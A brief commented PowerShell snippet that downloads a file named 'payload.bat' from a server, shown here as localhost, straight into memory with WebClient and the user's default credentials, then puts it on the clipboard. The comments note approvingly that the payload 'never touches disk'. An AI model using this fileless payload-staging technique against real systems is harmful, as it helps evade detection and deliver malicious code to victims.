<#
This code will download a file from a remote server into the $Command variable
It then copies the contents of the variable to the clipboard for future use.
This is really cool as the downloaded file never touches disk.
#>
$Command = '' #This is the variable to store the downloaded payload

#webclient variables
$web=New-Object System.Net.WebClient
$web.UseDefaultCredentials=$True
$url="http://127.0.0.1:8000/payload.bat"

$Command = $web.DownloadString($url)

#Put the download file to the clipboard.
[Windows.Forms.Clipboard]::SetText($Command)
